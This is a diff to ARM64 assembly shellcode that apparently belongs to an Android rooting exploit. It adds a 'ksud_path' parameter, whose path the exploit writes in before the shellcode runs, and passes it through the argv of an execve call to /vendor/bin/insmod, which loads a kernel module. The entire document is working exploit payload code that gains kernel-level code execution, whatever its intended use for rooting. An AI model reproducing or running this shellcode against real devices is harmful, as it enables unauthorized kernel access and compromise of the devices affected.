@@ -35,6 +35,17 @@ pkg_param:
 pkg_val:
     .skip 48, 0
 
+/* "ksud_path=" and its value read as one string: the exploit writes the
+ * manager's libksud.so path at libcxx_ksud_val_off before the shellcode runs. */
+ksud_param:
+    .ascii "ksud_path="
+ksud_val:
+    .skip 160, 0
+    .balign 4
+    .global libcxx_ksud_val_off
+libcxx_ksud_val_off:
+    .int ksud_val - libcxx_data
+
 /* "flags=" and its value read as one string: bit0 soft reboot, bit1 disable
  * modules, written at libcxx_flags_val_off. */
 flags_param:
@@ -133,16 +144,18 @@ libcxx_start:
     svc     0
 
     // execve("/vendor/bin/insmod",
-    //        [exe_path, ko_target, pkg_param, flags_param, NULL], NULL)
+    //        [exe_path, ko_target, pkg_param, ksud_param, flags_param, NULL], NULL)
     adr     x1, exe_path
     str     x1, [sp]
     adr     x1, ko_target
     str     x1, [sp, 8]
     adr     x1, pkg_param
     str     x1, [sp, 16]
-    adr     x1, flags_param
+    adr     x1, ksud_param
     str     x1, [sp, 24]
-    str     xzr, [sp, 32]
+    adr     x1, flags_param
+    str     x1, [sp, 32]
+    str     xzr, [sp, 40]
     adr     x0, exe_path
     mov     x1, sp
     mov     x2, xzr
